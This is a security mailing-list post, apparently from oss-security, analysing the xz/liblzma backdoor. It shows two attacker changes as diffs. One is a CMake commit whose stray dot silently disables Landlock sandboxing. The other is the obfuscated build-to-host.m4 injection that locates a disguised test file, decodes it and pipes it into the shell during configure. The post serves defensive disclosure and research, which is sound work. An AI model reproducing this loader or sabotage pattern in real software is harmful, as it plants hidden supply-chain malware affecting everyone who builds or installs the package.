@@ -1,0 +1,162 @@
+
+Date: Sat, 30 Mar 2024 04:34:11 +0100
+From: sjw@....ch
+To: oss-security@...ts.openwall.com
+Subject: Re: backdoor in upstream xz/liblzma leading to ssh
+ server compromise
+
+Another suspicious commit got some attention on GitHub. Unfortunately 
+GitHub just disabled the project, making this comments inaccessible, but 
+credits for this finding goes to them.
+
+If you need the sources to rollback your build to a version before 5.6.0 
+or access to the commit history for further research, you could use 
+their mirror [1].
+
+Commit 328c52da8a2bbb81307644efdb58db2c422d9ba7 [2] introduced a faulty 
+'.' in line 1004 of CMakeLists.txt. This causes the previous landlock.h 
+check to always fail and never build xz with the Landlock sandboxing 
+feature. If the sandbox is not explicitly enforced in build options, 
+this will fail silently.
+
+xz 5.4.6 does not support the Landlock sandbox at all. The suspicious 
+commit was only introduced in 5.6.1, 5.6.0 was not affected by this.
+I'm not aware of any distro that was already using the cmake build 
+system. I was not able to reproduce this with the common autotools build 
+system.
+
+
+--- a/CMakeLists.txt
++++ b/CMakeLists.txt
+@@ -901,10 +901,29 @@ endif()
+
+   # Sandboxing: Landlock
+   if(NOT SANDBOX_FOUND AND ENABLE_SANDBOX MATCHES "^ON$|^landlock$")
+-    check_include_file(linux/landlock.h HAVE_LINUX_LANDLOCK_H)
++    # A compile check is done here because some systems have
++    # linux/landlock.h, but do not have the syscalls defined
++    # in order to actually use Linux Landlock.
++    check_c_source_compiles("
++        #include <linux/landlock.h>
++        #include <sys/syscall.h>
++        #include <sys/prctl.h>
++.
++        void my_sandbox(void)
++        {
++            (void)prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
++            (void)SYS_landlock_create_ruleset;
++            (void)SYS_landlock_restrict_self;
++            (void)LANDLOCK_CREATE_RULESET_VERSION;
++            return;
++        }
++
++        int main(void) { return 0; }
++        "
++    HAVE_LINUX_LANDLOCK)
+
+-    if(HAVE_LINUX_LANDLOCK_H)
+-        set(SANDBOX_COMPILE_DEFINITION "HAVE_LINUX_LANDLOCK_H")
++    if(HAVE_LINUX_LANDLOCK)
++        set(SANDBOX_COMPILE_DEFINITION "HAVE_LINUX_LANDLOCK")
+           set(SANDBOX_FOUND ON)
+
+           # Of our three sandbox methods, only Landlock is incompatible
+
+
+
+
+I found another obfuscated function in build-to-host.m4 [3]:
+
+   gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 
+2>/dev/null`
+   if test -n "$gl_am_configmake"; then
+     HAVE_PKG_CONFIGMAKE=1
+   else
+     HAVE_PKG_CONFIGMAKE=0
+   fi
+
+
+The corrupt bad-3-corrupt_lzma2.xz file is the one matching the grep 
+expression and therefore the HAVE_PKG_CONFIGMAKE is set. However, I 
+found no other references to this variable.
+
+While build-to-host.m4 itself is not part of the repository, it was 
+added to gitignore in commit 4323bc3e0c1e1d2037d5e670a3bf6633e8a3031e.
+The original build-to-host.m4 was taken from gnulib [5] and only a few 
+changes were made to inject the backdoor.
+
+--- a/build-to-host.m4
++++ b/build-to-host.m4
+@@ -1,4 +1,4 @@
+-# build-to-host.m4 serial 3
++# build-to-host.m4 serial 30
+  dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.
+  dnl This file is free software; the Free Software Foundation
+  dnl gives unlimited permission to copy and/or distribute it,
+@@ -37,6 +37,7 @@
+
+    dnl Define somedir_c.
+    gl_final_[$1]="$[$1]"
++  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
+    dnl Translate it from build syntax to host syntax.
+    case "$build_os" in
+      cygwin*)
+@@ -58,14 +59,40 @@
+    if test "$[$1]_c_make" = '\"'"${gl_final_[$1]}"'\"'; then
+      [$1]_c_make='\"$([$1])\"'
+    fi
++  if test "x$gl_am_configmake" != "x"; then
++    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | 
+$gl_[$1]_prefix -d 2>/dev/null'
++  else
++    gl_[$1]_config=''
++  fi
++  _LT_TAGDECL([], [gl_path_map], [2])dnl
++  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl
++  _LT_TAGDECL([], [gl_am_configmake], [2])dnl
++  _LT_TAGDECL([], [[$1]_c_make], [2])dnl
++  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl
+    AC_SUBST([$1_c_make])
++
++  dnl If the host conversion code has been placed in $gl_config_gt,
++  dnl instead of duplicating it all over again into config.status,
++  dnl then we will have config.status run $gl_config_gt later, so it
++  dnl needs to know what name is stored there:
++  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 
+2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
+  ])
+
+  dnl Some initializations for gl_BUILD_TO_HOST.
+  AC_DEFUN([gl_BUILD_TO_HOST_INIT],
+  [
++  dnl Search for Automake-defined pkg* macros, in the order
++  dnl listed in the Automake 1.10a+ documentation.
++  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 
+2>/dev/null`
++  if test -n "$gl_am_configmake"; then
++    HAVE_PKG_CONFIGMAKE=1
++  else
++    HAVE_PKG_CONFIGMAKE=0
++  fi
++
+    gl_sed_double_backslashes='s/\\/\\\\/g'
+    gl_sed_escape_doublequotes='s/"/\\"/g'
++  gl_path_map='tr "\t \-_" " \t_\-"'
+  changequote(,)dnl
+    gl_sed_escape_for_make_1="s,\\([ \"&'();<>\\\\\`|]\\),\\\\\\1,g"
+  changequote([,])dnl
+
+
+
+
+[1] https://git.tukaani.org/
+[2] 
+https://git.tukaani.org/?p=xz.git;a=commitdiff;h=328c52da8a2bbb81307644efdb58db2c422d9ba7
+[3] 
+https://salsa.debian.org/debian/xz-utils/-/blob/46cb28adbbfb8f50a10704c1b86f107d077878e6/m4/build-to-host.m4#L86-91
+[4] 
+https://git.tukaani.org/?p=xz.git;a=commitdiff;h=4323bc3e0c1e1d2037d5e670a3bf6633e8a3031e
+[5] 
+https://git.savannah.gnu.org/gitweb/?p=gnulib.git;a=blob;f=m4/build-to-host.m4;hb=5b92dd0a45c8d27f13a21076b57095ea5e220870
+
+Download attachment "OpenPGP_signature.asc" of type "application/pgp-signature" (841 bytes)
